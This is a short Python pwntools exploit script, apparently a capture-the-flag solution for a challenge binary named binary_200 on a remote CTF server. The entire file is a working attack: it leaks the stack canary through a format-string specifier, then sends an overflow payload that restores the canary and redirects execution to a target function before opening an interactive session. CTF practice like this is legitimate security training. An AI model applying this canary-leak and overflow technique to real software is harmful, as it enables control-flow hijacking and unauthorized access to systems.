from pwn import *

elf=ELF('./binary_200')
r=remote('bamboofox.cs.nctu.edu.tw',22002)
print 'start'
#r=process('./binary_200')

sysadr=elf.symbols['canary_protect_me']

r.sendline('%15$08x')
print 'leak canary start'
canary=r.recv()[:8]
print 'Canary is 0x'+canary
print 'length',len(canary.decode("hex")[::-1])

payload='A'*(0x2c-0x4)+canary.decode("hex")[::-1]+'aaaaaaaaaaaa'+p32(sysadr)
r.sendline(payload)

r.interactive()
